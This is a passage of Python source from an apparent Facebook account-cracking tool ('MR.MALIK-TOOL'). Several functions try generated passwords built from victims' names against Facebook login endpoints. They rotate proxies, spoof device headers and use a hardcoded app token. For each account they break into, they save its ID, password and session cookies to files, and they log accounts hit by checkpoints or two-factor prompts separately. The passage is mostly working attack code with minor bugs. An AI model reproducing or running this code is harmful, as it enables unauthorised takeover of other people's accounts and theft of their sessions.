                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en;q=0.9,si-LK;q=0.8,si;q=0.7,en-US;q=0.6'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        RMX=session.cookies.get_dict().keys()
                        if "c_user" in RMX:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\x1b[38;5;46m[MR.MALIK-ALIVE] '+ids+' | '+pas+'\033[1;97m')
                                open('/sdcard/MR.MALIK-TOOL/FILE/RMX-M4-COOKIE.txt','a').write(ids+'|'+pas+' | '+kuki+'\n')
                                open('/sdcard/MR.MALIK-TOOL/FILE/RMX-M4-OK.txt','a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RMX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;31m[MR.MALIK-DEAD] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MR.MALIK-TOOL/FILE/RMX-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api4(ids,names,passlist)
        except Exception as e:pass
#▬▭▬▭▬▭▬▭[FILE METHOD 5]▬▭▬▭▬▭▬▭#
def api5(ids,names,passlist):
    try:
        global loop,oks,cps,sim_id
        sys.stdout.write('\r\r\033[1;37m[M5] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
            nip = random.choice(proxsi)
            proxs = {
                   'http': 'socks4://' + nip }
            data = {"adid": str(uuid.uuid4()),
'method': 'POST',
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'email': ids,
'password': pas,
'cpl': 'true',
'credentials_type': 'password',
'generate_session_cookies': '1',
'error_detail_type': 'button_with_disabled',
'generate_machine_id': '1',
'locale': 'en_GB',
'client_country_code': 'GB',
'omit_response_on_success': 'false',
'enroll_misauth': 'false',
'advertising_id': str(uuid.uuid4()),
'encrypted_msisdn': '',
'fb_api_req_friendly_name': 'authenticate'}
            headers={'Host': 'graph.facebook.com',
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
'x-fb-connection-bandwidth': '29920503', 
'x-fb-net-hni': '34528', 
'x-fb-sim-hni': '38333', 
'Zero-Rated': '0', 
'x-fb-connection-quality': 'EXCELLENT', 
'x-fb-connection-type': 'MOBILE.LTE', 
'user-agent': ethan_update_m5(), 
'content-type': 'app_authlication/x-www-form-urlencoded',
'x-fb-http-engine': 'Liger',
'x-fb-client-IP': 'True',
'x-fb-server-cluster': 'Keep-Alive',
'Content-Type': 'application/json'}
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            po = requests.post(url,data=data,proxies=proxs,headers=headers,).json()
            if 'session_key' in po:
                print('\r\r\x1b[38;5;46m[MR.MALIK-OK] '+ids+' | '+pas+'\033[1;97m')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookies = f"sb={ssbb};{coki}"
                open('/sdcard/MR.MALIK-TOOL/FILE/MR.MALIK-M5-COOKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                open('/sdcard/MR.MALIK-TOOL/FILE/MR.MALIK-M5-OK.txt','a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                  if 'y' in pcp:
                     print('\r\r\033[1;34m[MR.MALIK-2F] '+ids+' | '+pas)
                     twf.append(ids)
                     break
            elif 'www.facebook.com' in po['error']['message']:
                  if 'y' in pcp:        
                    print('\r\r\x1b[1;31m[MR.MALIK-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/MR.MALIK-TOOL/FILE/RMX-M5-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        api5(ids,names,passlist)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[RANDOM METHOD 1]▬▭▬▭▬▭▬▭#
def rmx1(ids,passlist):
    global loop,oks,cps,sim_id
    sys.stdout.write('\r\r\033[1;37m[M1] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
    try:
        for pas in passlist:
            session=requests.session()
            pro=dalvik_uaa_bd_large()
            link=session.get("https://mbasic.facebook.com/").text
            rr=random.randint
            data={
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': 'p',
            '__hs': '20156.BP:wbloks_caa_pkg.2.0...0',
            'dpr': '1',
            '__ccg': 'MODERATE',
            '__rev': '1020727961',
            '__s': ':i9p1qu:mahlv2',
            '__hsi': '7479797114083238570',
            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
            '__csr': '',
            '__hsdp': '',
            '__hblp': '',
            'fb_dtsg': 'NAcNUIYwJi18an1KNSKvDEsLdLTDlQVpg1Vud66BoblVCSXRf0aNVow:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1), 
            'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1), 
            'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"nlnwft:68\\",\\"password_text_input_id\\":\\"nlnwft:69\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"142710911300379\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"contact_point\\":\\"'+ids+'\\",\\"password\\":\\"#PWD_BROWSER:0:'+str(time.time()).split('.')[0]+':'+pas+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}',}
            headers = {
            'authority': 'mbasic.facebook.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://mbasic.facebook.com',
            'referer': 'https://mbasic.facebook.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"23090RA98G"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"14.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': pro,}
            session.post('https://mbasic.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=2c4733784ae1256fe36c8fac264a2939b8558cfc1bad5ac672c9bc60482cab5a',headers=headers, data=data).text
            RMX=session.cookies.get_dict().keys()
            if "c_user" in RMX:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid=coki.split("c_user=")[1].split(";")[0]
                nonvx=session.cookies.get_dict()["xs"][-2:]
                print('\r\r\x1b[38;5;46m[MR.MALIK-OK] '+uid+' | '+pas+'\033[1;97m') 
                open('/sdcard/MR.MALIK-TOOL/RANDOM/RMX-M1-COOKIE.txt','a').write(uid+'|'+pas+' | '+coki+'\n')
                open('/sdcard/MR.MALIK-TOOL/RANDOM/MR.MALIK-M1-OK.txt','a').write(uid+'|'+pas+'\n')
                oks.append(uid)
            elif "checkpoint" in RMX:
                print('\r\r\x1b[1;31m[MR.MALIK-CP] '+ids+' | '+pas+'\033[1;97m')
                open('/sdcard/MR.MALIK-TOOL/RANDOM/MR.MALIK-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
    except Exception as e:pass
#▬▭▬▭▬▭▬▭[RANDOM METHOD 2]▬▭▬▭▬▭▬▭#
def rmx2(ids,passlist):
    global loop,oks,cps,sim_id
    sys.stdout.write('\r\r\033[1;37m[M2] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
    try:
        for pas in passlist:
            adid = str(uuid.uuid4())
